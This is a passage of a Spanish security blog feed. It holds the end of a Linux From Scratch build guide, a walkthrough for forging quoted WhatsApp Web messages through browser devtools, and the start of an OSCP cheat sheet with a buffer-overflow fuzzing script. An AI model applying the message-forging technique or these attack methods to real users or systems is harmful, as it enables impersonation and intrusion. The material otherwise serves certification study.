&lt;/p&gt;&lt;br&gt;

También descomentaremos las siguientes y cambiaremos sus valores respectivos a **yes**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXV.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por último, cambiaremos el valor del **HOSTNAME** y descomentaremos la línea del **SYSKLOGD**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bYf.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Archivos de inicio de Bash Shell

El programa de shell **/bin/bash** utiliza una colección de archivos de inicio para ayudar a crear un entorno en el que ejecutarse. Cada archivo tiene un uso específico y puede afectar el inicio de sesión, así como los entornos interactivos de manera diferente.

Los archivos '*/etc/profile*' y '*~/.bash_profile*' son leídos en el momento en el que se invoca la shell como una shell de inicio de sesión interactivo.

La lista de todos los entornos locales compatibles con Glibc se pueden obtener ejecutando el siguiente comando:

```locale -a```

Simplemente seguid mis pasos para configurarlo de la misma manera:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bZq.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez hecho, ya estamos listos para adaptar nuestro fichero **profile**. En este caso, también crearemos de una tirada el archivo **inputrc**, un archivo de configuración de la biblioteca Readline, que proporciona capacidades de edición mientras el usuario ingresa una línea desde la terminal.

Este funciona traduciendo las entradas del teclado en acciones específicas:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bZr.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por otro lado, crearemos el archivo '*/etc/shells*', el cual contiene una lista de shells de inicio de sesión en el sistema:

```bash
cat &gt; /etc/shells &lt;&lt; &quot;EOF&quot;
# Begin /etc/shells

/bin/sh
/bin/bash

# End /etc/shells
EOF
```

Haciendo nuestro sistema booteable
===============================================================================================================================

#### Creando archivo fstab

El archivo **fstab** es utilizado por algunos programas para determinar dónde los sistemas de archivos deben de ser montados de forma predeterminada, en qué orden, y qué debe ser comprobado antes del montaje.

Lo que haremos será crear una nueva tabla de sistemas de archivos como esta:

```bash
cat &gt; /etc/fstab &lt;&lt; &quot;EOF&quot;
# Begin /etc/fstab

# file system  mount-point  type     options             dump  fsck
#                                                              order

/dev/&lt;xxx&gt;     /            &lt;fff&gt;    defaults            1     1
/dev/&lt;yyy&gt;     swap         swap     pri=1               0     0
proc           /proc        proc     nosuid,noexec,nodev 0     0
sysfs          /sys         sysfs    nosuid,noexec,nodev 0     0
devpts         /dev/pts     devpts   gid=5,mode=620      0     0
tmpfs          /run         tmpfs    defaults            0     0
devtmpfs       /dev         devtmpfs mode=0755,nosuid    0     0

# End /etc/fstab
EOF
```

En ella, ajustaremos los siguientes valores:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c1v.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Probablemente estarás pensando en que me he equivocado con los nombres, ¡pero no!... la idea será que **sdb** pase a convertirse a **sda**, ahora lo veréis con mayor detalle.

#### Instalación del Kernel

Nos dirigiremos a la ruta '*/sources*', y descomprimiremos el siguiente comprimido, aplicando a su vez los siguientes comandos:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c1T.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez hecho, abriremos con **vi** el archivo **.config** generado y haremos las siguientes comprobaciones:

* Confirmamos que **CONFIG_DEVTMPFS=y**
* Confirmamos que **CONFIG_EFI_STUV=y**
* Confirmamos que **CONFIG_UEVENT_HELPER** no esté seteado

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c22.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Si esto es así, podremos continuar sin problemas.

Ahora bien, lo que haremos será ejecutar el siguiente comando:

```bash
make menuconfig
```

Esto nos abrirá el siguiente menú:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c2c.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este menú, nos iremos a la opción que pone **General Setup**. Una vez dentro, veremos lo siguiente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c2d.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este punto, cambiaremos el valor de **Default hostname** al de nuestro sistema, en mi caso... **S4viOS**:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c2e.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez cambiado, salimos y guardamos los cambios.

Ya fuera, aplicamos los siguientes comandos para efectuar la compilación:

```bash
make
make modules_install
```

Una vez hecho, continuamos con los siguientes comandos:

```bash
cp -iv arch/x86/boot/bzImage /boot/vmlinuz-5.5.3-lfs-9.1
cp -iv System.map /boot/System.map-5.5.3
cp -iv .config /boot/config-5.5.3
install -d /usr/share/doc/linux-5.5.3
cp -r Documentation/* /usr/share/doc/linux-5.5.3

chown -R 0:0 .
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c4b.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Para terminar, ejecutamos estos últimos comandos antes de empezar con el GRUB:

```bash
install -v -m755 -d /etc/modprobe.d
cat &gt; /etc/modprobe.d/usb.conf &lt;&lt; &quot;EOF&quot;
# Begin /etc/modprobe.d/usb.conf

install ohci_hcd /sbin/modprobe ehci_hcd ; /sbin/modprobe -i ohci_hcd ; true
install uhci_hcd /sbin/modprobe ehci_hcd ; /sbin/modprobe -i uhci_hcd ; true

# End /etc/modprobe.d/usb.conf
EOF
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c4h.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Uso del GRUB para configurar el proceso de arranque

Ejecutaremos los siguientes comandos:

```bash
grub-install /dev/sdb

cat &gt; /boot/grub/grub.cfg &lt;&lt; &quot;EOF&quot;
# Begin /boot/grub/grub.cfg
set default=0
set timeout=5

insmod ext2
set root=(hd0,2)

menuentry &quot;GNU/Linux, Linux 5.5.3-lfs-9.1&quot; {
        linux   /boot/vmlinuz-5.5.3-lfs-9.1 root=/dev/sda2 ro
}
EOF
```

Nos debería salir un output tal que así:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c4B.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Eso sí... el archivo `grub.cfg` anteriormente creado deberá ser adaptado. En mi caso, tendrá estos valores:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c5s.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Creando archivos finales
===============================================================================================================================

Nos estamos acercando al final. Para ir concluyendo, nos vamos a ir creando una serie de archivos finales.

Por un lado, nos creamos un archivo `lsb-release`, en mi caso con el siguiente contenido:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c5E.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por otro lado, creamos el archivo `os-release`, en mi caso con el siguiente contenido:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c5N.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por último, nos crearemos un archivo `bashrc`:

```bash
cat &gt; /etc/bashrc &lt;&lt; &quot;EOF&quot; 
# Begin /etc/bashrc
# Written for Beyond Linux From Scratch
# by James Robertson &lt;jameswrobertson@earthlink.net&gt;
# updated by Bruce Dubbs &lt;bdubbs@linuxfromscratch.org&gt;
# System wide aliases and functions.
# System wide environment variables and startup programs should go 
into
# /etc/profile. Personal environment variables and startup programs
# should go into ~/.bash_profile. Personal aliases and functions 
should
# go into ~/.bashrc
# Provides colored /bin/ls and /bin/grep commands. Used in 
conjunction
# with code in /etc/profile.
alias ls='ls --color=auto'
alias grep='grep --color=auto'
# Provides prompt for non-login shells, specifically shells started
# in the X environment. [Review the LFS archive thread titled
# PS1 Environment Variable for a great case study behind this script
# addendum.]
NORMAL=&quot;\[\e[0m\]&quot;
RED=&quot;\[\e[1;31m\]&quot;
GREEN=&quot;\[\e[1;32m\]&quot;
if [[ $EUID == 0 ]] ; then
PS1=&quot;$RED\u [ $NORMAL\w$RED ]# $NORMAL&quot;
else
PS1=&quot;$GREEN\u [ $NORMAL\w$GREEN ]\$ $NORMAL&quot;
fi
unset RED GREEN NORMAL
# End /etc/bashrc
EOF
```

Arrancando nuestra nueva distribución Linux S4viOS
===============================================================================================================================

Antes de reiniciar, desmontaremos todas las monturas que teníamos previamente creadas:

```bash
umount -v $LFS/dev/pts
umount -v $LFS/dev
umount -v $LFS/run
umount -v $LFS/proc
umount -v $LFS/sys
cd /
umount -v $LFS
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6r.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Atentos al comando final:

```bash
shutdown -F now
```

Una vez hecho, como es de esperar... nuestra máquina virtual se habrá apagado. Ahora bien, lo que haremos será lo siguiente, como dije anteriormente de lo que definimos en el **fstab**, nuestro **sdb** se va a convertir en **sda**, ¿cómo?, pues simplemente quitando el disco del sistema Host con Debian.

Es decir, tenemos estos 2:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6w.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Pues lo que hacemos es quitar el **Debian Base**, que es con el que nos hemos construido nuestro sistema Linux residente en el otro disco. Nos debería quedar algo así:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6x.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

¡Arranquemos la máquina virtual y veamos qué pasa!:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6F.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Esto tiene muy buena pinta, presionamos Enter:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6E.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

¡Qué preciosidad!, nuestro propio sistema Linux cobrando vida, ¡vamos a iniciar sesión!:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6G.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Como veis, perfectamente funcional y con total control de las cosas que hemos ido instalando (sin cosas raras):

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6H.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ya en este punto, podríamos continuar con la instalación y configuración de la interfaz gráfica, pero... esto lo haré en otra **guía aparte** siempre y cuando vea que este Gist recibe apoyo :)

Mientras tanto, os dejo por aquí un vídeo de mi canal de YouTube donde os enseño paso a paso a configurar un buen entorno de trabajo en Linux:

[https://www.youtube.com/watch?v=MF4qRSedmEs](https://www.youtube.com/watch?v=MF4qRSedmEs)

Quién sabe, igual podremos hacer luego una fusión con **S4viOS**. 

Para aquellos que por X razones quieran descargar la distribución (igual lo queréis para verificar ciertas cosas), os dejo el enlace de descarga de la máquina por aquí: 

* [https://drive.google.com/file/d/1GACSGENgHvWr2v_8JbcUieLyZAoU11qe/view?usp=sharing](https://drive.google.com/file/d/1GACSGENgHvWr2v_8JbcUieLyZAoU11qe/view?usp=sharing)

&gt; **Usuario de la máquina**: root

&gt; **Contraseña**: nmapypadentro

¡Un saludo y que os sea leve!</content><author><name>J0hnTena</name></author><category term="Linux" /><category term="Linux From Scratch" /><category term="LFS" /><category term="Personalización" /><category term="S4viOS" /><summary type="html">En este artículo, os enseño a crear vuestro propio sistema Linux desde cero, tomando completo control de las cosas que se instalan y arrancando el sistema como una nueva distribución.</summary></entry><entry><title type="html">Falsificación de mensajes en WhatsApp</title><link href="http://localhost:4000/falsificacion-mensajes-whatsapp/" rel="alternate" type="text/html" title="Falsificación de mensajes en WhatsApp" /><published>2020-02-10T00:00:00-06:00</published><updated>2020-02-10T00:00:00-06:00</updated><id>http://localhost:4000/falsificacion-mensajes-whatsapp</id><content type="html" xml:base="http://localhost:4000/falsificacion-mensajes-whatsapp/">&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/whatsapp.jpg&quot;&gt;
&lt;/center&gt;

## ¿Cómo reproducir este bug?

Antes que nada, vamos a darle los buenos créditos al señor [@RiftWhiteHat](https://twitter.com/RiftWhiteHat), que fue el que me enseñó esta maravilla bajo la cual pueden surgir investigaciones para todo aquel que le quiera meter mano y tal vez descubrir nuevas cosas.

Comenzamos presionando la combinación `Ctrl+Shift+C`. Posteriormente, nos dirigimos a la pestaña `Sources` desde WhatsApp Web:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step1.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;
Una vez hecho, nos iremos a la pestaña `Search` situada en la zona inferior y buscaremos la cadena `Promise.callSynchronously(function()`

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step2.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;
Veremos que se produce un match. Haremos click en el resultado obtenido y posteriormente en la zona superior seleccionamos el modo de visión `Pretty Print` para que no nos sangren los ojos:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step3.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;
Ya en este punto, presionaremos la combinación de teclas `Ctrl+F` y buscaremos nuevamente por la cadena `Promise.callSynchronously(function()`. En esta ocasión, buscaremos el segundo match que se produzca:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step4.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Posteriormente, establecemos un `Breakpoint` en la sección `var t = e.id;`, haciendo para ello click en el número de la línea:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step5.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Ahora, lo que haremos será lo siguiente. Nos iremos a una conversación cualquiera con uno de nuestros compañeros, seleccionaremos cualquier mensaje que nos haya enviado y le daremos a `Responder` para hacer mención a ese comentario.

Escribiremos como respuesta lo que queramos, yo en este caso he escrito `No sé si conocerás el canal de S4vitar`. Tras enviar el mensaje, veremos que alcanzamos el `Breakpoint` y que el mensaje no llega a enviarse:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step6.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Si nos vamos a la pestaña `Console` dentro de la pestaña `Sources`, veremos que en este preciso instante podemos desglosar `e`, pudiendo así ver todos los atributos que hacen referencia a la conversación que estamos llevando a cabo:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step7.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

En este caso, muestro sólo una porción para no compartir información privilegiada.

Ya en este punto, podremos manipular el mensaje de mención al que estamos respondiendo de la siguiente forma:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step8.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Lo único que tendremos que hacer posteriormente es darle al `Play` para que el mensaje siga su flujo y salgamos del `Breakpoint`:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step9.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Una vez hecho, podremos ver lo siguiente:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step10.jpg&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Hemos falsificado el mensaje al cual hacemos mención, haciendo creer al destinatario que nos ha escrito ese mensaje cuando no es así.

Todo esto desde WhatsApp web, y te preguntarás... ¿cómo se ve desde el móvil?, pues se vería exactamente igual:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step11.jpg&quot; width=&quot;400&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

Como veis, es un bug que a día de hoy se puede seguir explotando. De hecho, atendiendo a los atributos de la variable `e`, podréis ver que en verdad las posibilidades son infinitas.

Existen montón de valores que se pueden alterar, los cuales han llegado incluso a ocasionar Crasheos de la propia aplicación, como podréis ver en el siguiente artículo:

* [https://research.checkpoint.com/2019/breakingapp-whatsapp-crash-data-loss-bug/](https://research.checkpoint.com/2019/breakingapp-whatsapp-crash-data-loss-bug/)

Este último en concreto ha sido parcheado, sin embargo sólo en el ámbito grupal (grupos de WhatsApp), en el sentido de que ya no afecta a los componentes de un grupo, sino al propio emisor del mensaje especialmente diseñado:

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step12.jpg&quot; width=&quot;400&quot;&gt;
&lt;/center&gt;

&lt;br&gt;

¡Dejo en vuestras manos la investigación para que encontréis cosas chulas!</content><author><name>J0hnTena</name></author><category term="WhatsApp" /><category term="Manipulación" /><category term="Bug" /><summary type="html">En este artículo, os muestro cómo es posible manipular los mensajes de otras personas en WhatsApp, explotando para ello un bug que a día de hoy sigue funcionando.</summary></entry><entry><title type="html">Preparación OSCP</title><link href="http://localhost:4000/oscp-preparacion/" rel="alternate" type="text/html" title="Preparación OSCP" /><published>2020-02-04T00:00:00-06:00</published><updated>2020-02-04T00:00:00-06:00</updated><id>http://localhost:4000/oscp-preparacion</id><content type="html" xml:base="http://localhost:4000/oscp-preparacion/"># Preparación para el OSCP (by s4vitar)

![OSCP Image](http://funkyimg.com/i/2MPB4.png)
#### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet

&lt;br&gt;
Esta guía es la misma que tengo publicada en mi Gist:

* [https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e)

## Índice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Buffer Overflow Windows (25 puntos)](#buffer-overflow-windows)
     * [Fuzzing](#fuzzing)
     * [Calculando el Offset (Tamaño del Búffer)](#calculando-el-offset)
     * [Controlando el registro EIP](#controlando-el-registro-eip)
     * [Situando y Asignando Espacio al Shellcode](#situando-y-asignando-espacio-al-shellcode)
     * [Detectando los Badchars](#detectando-los-badchars)
     * [Generando el Shellcode](#generando-el-shellcode)
     * [Salto al ESP (Mona / Immunity Debugger)](#salto-al-esp)
     * [Mejorando el Exploit](#mejorando-el-exploit)
     * [Reduciendo el Size y Acceso por Powershell](#reduciendo-el-size-y-acceso-por-powershell)
- [Buffer Overflow Linux](#buffer-overflow-linux)
     * [Calculando el Offset (Linux)](#calculando-el-offset-en-linux)
     * [Register Enumeration](#register-enumeration)
     * [JMP ESP Opcode](#jmp-esp-opcode)
     * [JMP EAX From ESP](#jmp-eax-from-esp)
     * [Msfvenom Linux Payload](#msfvenom-linux-payload)
     * [Ganando Acceso al Sistema](#ganando-acceso-al-sistema)
     
- [Pentesting](#pentesting)
     * [General](#general)
       * [Port Scanning](#port-scanning)
       * [Wfuzz](#Wfuzz)
       * [Nikto](#Nikto)
       * [Enumeración SNMP](#snmp-enumeration)
       * [Reverse Shell](#reverse-shell)
       * [Spawning a TTY Shell](#spawning-a-tty-shell)
       * [Compilado de Exploits para Windows](#compilado-de-exploits-para-windows)
       * [Squid Proxy](#squid-proxy)
       * [Metasploit Debugging](#metasploit-debugging)
     * [Pentesting Web](#pentesting-web)
       * [LFI (Local File Inclusion)](#lfi)
       * [LFI (Local File Inclusion) Code Examples](#lfi-code-examples)
       * [RFI (Remote File Inclusion)](#rfi)
       * [LFI to RCE](#lfi-to-rce)
       * [LFI to RCE via PHP Sessions](#lfi-to-rce-via-php-sessions)
       * [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-environ)
       * [LFI RFI using Wrappers](#lfi-rfi-using-wrappers) 
       * [SQLI (SQL Inyection)](#sqli)     
       * [Shellshock](#shellshock)
       * [Padding Oracle Attack](#padding-oracle-attack)   
       * [WordPress](#wordpress)
       * [PHP Reverse Shell Manual Multifuncional](#php-reverse-shell-manual-multifuncional)       
       * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
       * [NoTCPShell](#notcpshell) 
       * [Bypass File Upload Filtering](#bypass-file-upload-filtering)
       * [XML External Entity Injection](#xml-external-entity-injection)
       * [X-Jenkins Remote Code Execution](#x-jenkins)
       * [PHP-CGI Exploitation](#php-cgi-exploitation)
       * [WAF Bypassing](#waf-bypassing)
     * [Pentesting Linux](#pentesting-linux)
        * [Tratamiento de la TTY](#tratamiento-de-la-tty)
        * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
        * [Escaping Restricted Shell](#escaping-restricted-shell)
        * [Pivoting con Shuttle](#pivoting-con-shuttle)
        * [Port Knocking](#port-knocking)
     * [Pentesting Windows](#pentesting-windows)
        * [Transferencia de Archivos](#transferencia-de-archivos)
        * [Evasión de Antivirus con Malware Genético](#av-evasion-genetic-malware)
        * [Port Forwarding y Técnicas de Enrutamiento](#windows-port-forwarding)
        * [Hashdump Manual](#hashdump-manual)
        * [PassTheHash](#passthehash)
        * [Enumeration &amp; Privilege Escalation](#enumeration-and-privilege-escalation)
        * [Powershell Reverse Shell](#powershell-reverse-shell)
        * [Migración manual a proceso a 64 bits](#manual-migration-process)
        * [RCE Filter Evasion Microsoft SQL](#rce-filter-evasion-microsoft-sql)
        * [Conexión al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)
        * [Reconocimiento del Sistema](#reconocimiento-del-sistema)
        * [Kernel Exploits Windows](#kernel-exploits-windows)
        * [Privilege Escalation Enumerations](#privilege-escalation-enumerations)

          
Antecedentes
===============================================================================================================================
Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiración para aquel que pretenda sacarse la certificación.

#### ¿Es difícil la certificación?

![Certificado Físico](http://funkyimg.com/i/2Ptt9.jpg)

Diría que la respuesta es relativa, siempre va a depender de la soltura que tengas con máquinas de tipo _CTF/Challenge_. 

A mi por ejemplo la plataforma **HackTheBox** me ha servido de mucho para coger todo el fondo que tengo a día de hoy, así como **VulnHub** u **OverTheWire**. De hecho, lo que más me sorprendió a la hora de ir haciendo las máquinas del laboratorio fue la gran similitud con las máquinas de HackTheBox. Hablando en términos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como llegué a leer en su momento en algunos artículos de gente que había pasado con éxito la certificación.

Eso si, la certificación fue dura, de las más duras que he hecho en mi vida, con mis momentos de desesperación en los que no llegaba a ver las cosas claras, sobre todo por la nueva modalidad **Proctored**, que quieras o no pone un poco nervioso. Mi consejo en este punto es que no tires nunca la toalla, ni aunque quede 1 hora de examen. De hecho, fue justamente 2 horas antes de acabar el examen cuando lo iba a dar todo por perdido hasta que se me ocurrió un vector de ataque que milagrosamente funcionó y logré explotar con éxito comprometiendo otro de los sistemas de la red (con escalada de privilegios incluido).

Para que te quedes tranquilo, si juegas mucho con máquinas de tipo CTF y te entrenas día a día con retos desafiantes que te hagan pensar, no tienes de qué preocuparte.

#### ¿Qué plan me pillo?

En mi caso me llegué a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. 

Os puedo decir que en 1 mes ya tenía casi todas las máquinas hechas menos 4 de ellas que me siguieron quedando pendientes y no llegué a hacer (Eran las más Hard y vi que escapaban demasiado de la metodología del examen).

El segundo mes lo utilicé para seguir con HackTheBox así como para repasar las máquinas hechas y probar vías alternativas de resolver las mismas.

En base a cómo lo he vivido yo, os recomendaría más bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compañero **Julio Ureña**, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.

#### ¿Qué bases tuve antes de comenzar con la certificación?

A nivel de Pentesting, en VulnHub tenía 30 máquinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 máquinas con permisos de administrador en cada una de ellas.

A nivel de Sistemas y programación, con muy buenas bases de Linux Avanzado, programación en Bash Avanzado y ligero tanto de Windows como de Python. Sí que es cierto que la certificación me hizo meterme más a fondo con Windows, así como con la programación en Python, de ahí me motivé de hecho para hacer la herramienta **spoofMe** para el Spoofing de llamadas y mensajería instantánea. 

A su vez a esto le sumo las auditorías reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar también en entornos reales me hace ver las cosas desde otra perspectiva.

Por último, a nivel de Búffer Overflow, no sabía hacer nada... entré con la mente en blanco a la certificación. Sin embargo, en 4 días ya sabía hacer todos los ejercicios del laboratorio en base a la guía y a los vídeos de apoyo con los que cuentas en el material que te dan.

#### ¿Qué horarios de estudio seguías?

Esto tal vez ha sido lo más mortal, desafiante, doloroso pero a su vez fructífero. Estuve aplicando **Uberman** durante los 3 meses de preparación, una técnica de sueño polifásico que hace que con tan sólo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).

Decidí aplicarlo porque básicamente el día se pasaba muy rápido, cuando uno está trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demás. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la técnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la mañana.

He de decir que también es un gran puñado de motivación lo que hace que estés dispuesto a hacer esto, en caso contrario ni lo habría intentado. Aún así no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerá de cada cual como pretenda organizarse sus horas de estudio.

#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?

En primer lugar hacerte una cuenta de **HackTheBox**, incluso te diría de pagarte la cuenta VIP para tener acceso a las máquinas retiradas. Tienes a tu disposición canales en Youtube como el de **ippsec**, que te explica paso a paso todas las máquinas retiradas con técnicas bastante chulas tanto de explotación en Windows como en Linux.

Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harán ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las máquinas del laboratorio, te darás cuenta de que los entornos están un poco &quot;deprecated&quot;, en el sentido de que son máquinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas máquinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues están pensadas para que practiques distintas vías de explotación con técnicas no tan actuales, lo que hace que ganes más fondo.

#### ¿Qué es lo más duro de la certificación?

La gestión del tiempo. Mi recomendación y por lo que he escuchado de los demás y coincido, es empezar con el Búffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te debería de llevar más de 1 hora.

Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la máquina de 10 puntos, suele ser una explotación rápida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo más recomendable es dedicarle un buen tiempo a la otra máquina de 25 puntos, pues en caso de sacarla, estarías a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarías aprobado (Intenta aspirar a más y hazlas todas :P).

En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilación y ejecución de exploits, pues en la mayoría de las veces te dará una petada de las importantes. Pero no te frustres, siempre con un poco de café y buena actitud se saca.

#### ¿Cuáles son los siguientes pasos?

Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aún me queda un puñado de cosas por aprender. Será cuestión de seguir aprendiendo lo que hará que aparezca una respuesta a esta pregunta.

Sin más, ¡os dejo con toda la preparación del curso!


Buffer Overflow Windows
===============================================================================================================================
A continuación, se listan los pasos a seguir para la correcta explotación del Buffer Overflow en Windows (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.

Servicios/Máquinas con los que practicar:

-   SLMail 5.5 
-   Minishare 1.4.1
-   Máquina Brainpan de VulnHub
-   Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio

Generalmente, la metodología a seguir es la que se describe a continuación.

#### Fuzzing

Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

buffer = [&quot;A&quot;]
ipAddress = sys.argv[1]

port = 4000
contador = 100

while len(buffer) &lt; 30:
  buffer.append(&quot;A&quot;*contador)
  contador += 200
  
for strings in buffer:
  try:
    print &quot;Enviando %s bytes...&quot; % len(strings)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    s.send(&quot;USER &quot; + strings + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print &quot;\nError de conexión...\n&quot;
    sys.exit(0)

```
De esta forma, a través de una lista, vamos almacenando en la variable **buffer** el caracter &quot;A&quot; un total 30 veces con un incremento para cada una de las iteraciones en 200. 

Esto es:

**[1 caracter &quot;A&quot;, 100 caracteres &quot;A&quot;, 300 caracteres &quot;A&quot;, 500 caracteres &quot;A&quot;, 700 caracteres &quot;A&quot;, ...]**

Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.

Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter &quot;A&quot; en hexadecimal.

